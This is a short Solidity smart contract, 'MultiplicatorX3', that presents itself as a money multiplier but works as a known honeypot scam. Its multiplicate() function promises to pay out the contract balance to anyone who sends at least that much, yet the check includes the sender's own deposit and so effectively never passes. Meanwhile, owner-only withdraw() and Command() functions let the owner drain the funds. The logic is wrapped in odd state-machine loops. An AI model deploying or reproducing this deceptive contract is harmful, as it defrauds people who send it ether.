pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        uint _state = 0;
        while(true) {
            if (_state == 0) {
                require(msg.sender == Owner);
                _state = 1;
            } else if (_state == 1) {
                Owner.transfer(this.balance);
                break;
            }
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        uint _state = 0;
        while(true) {
            if (_state == 0) {
                require(msg.sender == Owner);
                _state = 1;
            } else if (_state == 1) {
                adr.call.value(msg.value)(data);
                break;
            }
        }
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        uint _state = 0;
        while(true) {
            if (_state == 0) {
                if(msg.value>=this.balance) {
                    _state = 1;
                } else {
                    break;
                }
            } else if (_state == 1) {
                adr.transfer(this.balance+msg.value);
                break;
            }
        }
    }
}